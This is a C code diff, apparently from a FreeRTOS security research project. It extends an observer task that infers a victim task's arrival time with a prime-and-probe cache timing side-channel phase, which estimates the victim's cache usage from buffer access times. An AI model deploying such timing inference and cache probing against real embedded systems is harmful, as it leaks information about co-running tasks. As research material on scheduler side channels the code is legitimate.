@@ -13,6 +13,8 @@
 #include "IntermittentInterval.h"
 #include "../SyntheticTasks.h"
 
+#include "../CacheTimingAttack/CacheTimingAttackFunctions.h"
+#include "../CacheTimingAttack/CacheTimingAttackDemoTask.h"
 
 void prvObserverTask( void *pvParameters );
 void initInferenceBase(u32 u32InVictimPeriod);
@@ -33,9 +35,16 @@ void createAttackerTasks(void) {
 extern TickType_t firstTickCount;
 extern TaskParam appTaskParamArray[];	// from SyntheticTasks.c
 extern XTime firstGtTimeCount;	// From SyntheticTasks.c
+u64 inferenceResult;
 CapturedExecIntervals capturedExecIntervals;
+int attackPhase;
+u32 cacheAttackBufferArray[SIZE_OF_CACHE_ATTACK_ARRAY];	// Too big to fit the stack size limit of a FreeRTOS task.
 void prvObserverTask( void *pvParameters )
 {
+	attackPhase = 1;
+
+	u32 u32VictimPeriod = appTaskParamArray[VICTIM_TASK_ID_OFFSET].periodUs*333.333333;
+
 	// Initialize attacker's inference base.
 	initInferenceBase(appTaskParamArray[VICTIM_TASK_ID_OFFSET].periodUs*333.333333);
 	initCapturedExecIntervals();
@@ -67,8 +76,8 @@ void prvObserverTask( void *pvParameters )
 	//u32 u32HackerQueueData = 0;
 
 
-	while (1) {
-		feedAppLog(getTaskId(), 0, "BEGIN");
+	while (attackPhase == 1) {
+		//feedAppLog(getTaskId(), 0, "BEGIN");
 
 		XTime_GetTime(&u32ObserveBeginTime);
 		//u32ObserveBeginTime = GET_GTIMER_LOWER;
@@ -100,17 +109,6 @@ void prvObserverTask( void *pvParameters )
 				// Set begin time for the next execution interval.
 				u32CurrentExecIntervalBeginTime = u32ObserveEndTime;
 
-				// Inform high hacker task
-//				u32HackerQueueData = u32ObserveTimeDiff;
-//				if ( xQueueSend( hackerQueue, &u32HackerQueueData, ( TickType_t ) 0 ))	// Send the value to queue.
-//				{
-//					u32ObserveBeginTime = u32ObserveEndTime;
-//				}
-//				else
-//				{
-//					u32ObserveBeginTime = u32ObserveEndTime;
-//				}
-
 				//feedAttackerLog(getTaskId(), inferenceResult*3, "PRREMPT-INFERENCE");
 			}
 
@@ -136,6 +134,66 @@ void prvObserverTask( void *pvParameters )
 		//feedAppLog(getTaskId(), 0, "END");
 
 		vTaskDelayUntil( &xLastWakeTime, OBSERVER_TASK_PERIOD_US/1000/portTICK_RATE_MS );
+	}
+
+	XTime currentTime;
+
+	u32 u32BufferAccessTime;	// To store the total access time of the buffer.
+	u32 u32CacheMissEstimate;	// The unit is CPU cycles (ticks).
+	u32 u32CacheUsageSampleCount;
+	u32 u32SumOfCacheMissEstimate;	// It is used for averaging sampled cache miss estimates.
+	u32 u32CacheMissEstimateAverage;	// The average of u32SumOfCacheMissEstimate. The unit is CPU cycles (ticks).
+
+	u32CacheUsageSampleCount = 0;
+	u32SumOfCacheMissEstimate = 0;
+	while (attackPhase == 2) {
+		vTaskDelay( 1/portTICK_RATE_MS );
+
+		XTime_GetTime(&currentTime);
+		XTime shiftedTime = currentTime%(u64)u32VictimPeriod;
+		if (shiftedTime >= inferenceResult) {
+			continue;
+		} else if (inferenceResult - shiftedTime > 333333) {//  1000000/3, 1ms
+			continue;
+		}
+
+		/* "Prime" step:
+		 * 		Fill the data cache with attacker's data. */
+		vDataCacheFlush();
+		getTimeLoadLineIntArrayRange(cacheAttackBufferArray, Line_OF_CACHE_ATTACK_ARRAY);
+
+		// "Trigger": Delay some time to let the victim use memory.
+		vTaskDelay( CACHE_ATTACK_TASK_DELAY_TIME_MS );
+
+		// "Probe": Read the buffer again and compute cache-miss amount.
+		u32BufferAccessTime = getTimeLoadLineIntArrayRange(cacheAttackBufferArray, Line_OF_CACHE_ATTACK_ARRAY);
+
+		// H+M=512000/32 lines = 16000 lines
+		// H = 16000 - M
+		// Ch*H + Cm*M = u32TimeDiff
+		// 50*H + 77*M = u32TimeDiff
+		// Thus, 50*(16000-M) + 77*M = u32BufferAccessTime
+		//       27M = u32BufferAccessTime - 50*16000
+		//	       M = u32BufferAccessTime/27 - 22500
+		u32CacheMissEstimate = (u32BufferAccessTime/(C_M_LINE-C_H_LINE)) - C_H_LINE*Line_OF_CACHE_ATTACK_ARRAY/(C_M_LINE-C_H_LINE);
+
+		u32SumOfCacheMissEstimate += u32CacheMissEstimate;
+		u32CacheUsageSampleCount++;
+
+		// Average sampled cache-miss estimates.
+		if (u32CacheUsageSampleCount >= CACHE_ATTACK_TASK_AVERAGE_TIMES) {
+			u32CacheMissEstimateAverage = u32SumOfCacheMissEstimate/CACHE_ATTACK_TASK_AVERAGE_TIMES;
+			feedAppLog(getTaskId(), u32CacheMissEstimateAverage, "H");
+
+			// Hint: How to use u32CacheMissEstimateAverage:
+			// 		[cycles of 512kB miss] - u32CacheMissEstimateAverage = [time of X-Byte hit]
+			// 		[time of X-Byte hit] / [time of 1-Byte hit] = [Y-Byte used by others]
+
+			// Reset variables for the next cycle.
+			u32CacheUsageSampleCount = 0;
+			u32SumOfCacheMissEstimate = 0;
+		}
+
 	}
 }
 
@@ -188,7 +246,7 @@ void applyObserverTaskExecInterval(XTime u32ExecIntervalBeginTime, XTime u32Exec
 
 
 // cost: 1300 ns
-u32 getArrivalTimeInference(void) {
+u64 getArrivalTimeInference(void) {
 	// Get complementary intervals, find the largest interval and return the begin time.
 	Interval largestComplInterval;
 	InterInterval_getLargestComplementaryInterval(&inferenceBase, &largestComplInterval, TRUE);
@@ -250,7 +308,7 @@ int lcm(int a, int b)
     return temp ? (a / temp * b) : 0;
 }
 
-void computeAndPrintInferenceResult(void) {
+u64 computeAndPrintInferenceResult(void) {
 
 	/* GCD(p_o,p_v) */
 	u32 u32VictimPeriodUs = appTaskParamArray[VICTIM_TASK_ID_OFFSET].periodUs;
@@ -279,20 +337,20 @@ void computeAndPrintInferenceResult(void) {
 			dataInvalid = True;
 		}
 	}
-	u32 inferenceResult = getArrivalTimeInference();
+	inferenceResult = getArrivalTimeInference();
 
 	if (dataInvalid == True) {
 		xil_printf("\r\nInvalid data!!\r\n");
 	}
 
-	xil_printf("\r\nInference Result = %d ns \r\n", inferenceResult*3);
+	xil_printf("\r\nInference Result = %d ns \r\n", (u32)inferenceResult*3);
 
 
 	/* Compute precision ratio. */
 	u32 victimPeriod = inferenceBase.baseEnd;
 	u32 initialArrival = firstGtTimeCount%victimPeriod;
 
-	double precisionRatio = computeInferencePrecisionRatio(victimPeriod, initialArrival, inferenceResult);
+	double precisionRatio = computeInferencePrecisionRatio(victimPeriod, initialArrival, (u32)inferenceResult);
 
 	char output[20];
 	gcvt(precisionRatio,10,output);
@@ -304,4 +362,20 @@ void computeAndPrintInferenceResult(void) {
 	/* Print captured intervals (not inference intervals). */
 	InterInterval_outputIntervals(&inferenceBase);
 
+	return inferenceResult;
+}
+
+void computeInferenceResult(void) {
+	u32 i;
+	Interval *thisInterval;
+	Boolean dataInvalid = False;
+	for (i=0; i<capturedExecIntervals.count; i++) {
+		thisInterval = &(capturedExecIntervals.intervals[i]);
+		applyObserverTaskExecInterval(thisInterval->begin, thisInterval->end);
+
+		if (thisInterval->begin < firstGtTimeCount) {
+			dataInvalid = True;
+		}
+	}
+	inferenceResult = getArrivalTimeInference();
 }
